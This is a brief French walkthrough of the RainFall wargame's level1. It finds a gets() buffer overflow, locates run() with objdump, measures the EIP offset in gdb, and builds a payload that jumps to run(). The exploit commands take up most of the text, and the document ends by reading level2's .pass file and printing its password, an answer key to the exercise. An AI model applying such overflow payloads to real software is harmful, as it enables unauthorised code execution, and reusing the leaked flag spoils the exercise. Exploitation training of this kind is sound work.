# Analyse du code

Il y a deux fonctions. La main et un autre fonction run qui elle n'est pas appeler dans le main.
La fonction gets est appeler pour remplir un buffer, sans controle prealable.
A cause de cela, si l'input est plus grand que buffer il y a un depassement de tampon
On pourra donc rediriger EIP vers run()

# Preparation du payload

- Adresse de run() :
level1@RainFall:~$ objdump -t ./level1 | grep run
08048444 g     F .text  0000003c              run

- taille buffer :
gdb ./level1
(gdb) b *0x08048490 ; (adresse du call de gets)
(gdb) r < <$(python -c "print('a' * 76 + 'bbbb')")
[ apres 3 sauts instructions, au moment du segfault nous voyons que eip a bien ete ecrasse ]
(gdb) info registers
[...]
eip            0x62626262       0x62626262 ; 62 = b en ascii
[...]

- payload :
	python -c 'print("a"*76 + "\x44\x84\x04\x08")' > /tmp/_

# Exploit
	cat /tmp/_ - | ./level
	cat  /home/user/level2/.pass
	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77